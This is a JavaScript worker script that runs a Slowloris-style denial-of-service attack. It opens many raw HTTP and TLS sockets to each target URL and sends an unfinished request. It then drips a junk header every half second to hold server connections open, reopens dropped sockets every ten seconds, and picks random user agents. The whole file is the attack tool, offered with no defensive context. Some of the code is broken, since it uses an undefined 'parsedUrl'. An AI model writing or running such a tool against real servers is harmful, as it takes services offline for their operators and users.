const randomUseragent = require('random-useragent');
const {
     parentPort, workerData
  } =                   require('worker_threads');
const URL = require("url");
const tls = require("tls");
const net = require("net");
const { urls, sockets, proxyList } = workerData;


// const parsedUrl = URL.parse(program.args[0]);
const aliveSockets = {};

createSocket = (options, connectionModule) => {
    const socket = connectionModule.connect(options, () => {
        socket.write("GET / HTTP/1.1\r\n");
        socket.write(`Host: ${parsedUrl.host}\r\n`);
        socket.write("Accept: */*\r\n");
        socket.write(
            `${randomUseragent.getRandom()}\r\n`
        );

        setInterval(() => {
            socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
        }, 500);
    });

    socket.on("error", err => {
        socket.destroy();
    });
};

for (const url of urls) {
    const connectionModule = url.includes('https:') ? tls : net;

    for (let i = 0; i < sockets; i++) {
        createSocket({
            port: url.includes('https:') ? 443 : 80,
            host: url
        }, connectionModule);

        aliveSockets[url] = i;
    }
}

function Resurrect (sockets, url) {
    const countResurrectSockets = sockets - aliveSockets[url];
    const connectionModule = url.includes('https:') ? tls : net;

    for (let i = 0; i < countResurrectSockets; i++) {
        createSocket({
            port: url.includes('https:') ? 443 : 80,
            host: url
        }, connectionModule);
    }
}

setTimeout(() => {
    Object.keys(aliveSockets).forEach(url => {
        parentPort.postMessage({ url: aliveSockets, success: 'socket' })
    });
}, 1000)

setInterval(() => {
    Object.keys(aliveSockets).forEach(url => {
        if (aliveSockets[url] < sockets) return Resurrect(sockets, url)
    })
}, 10000);
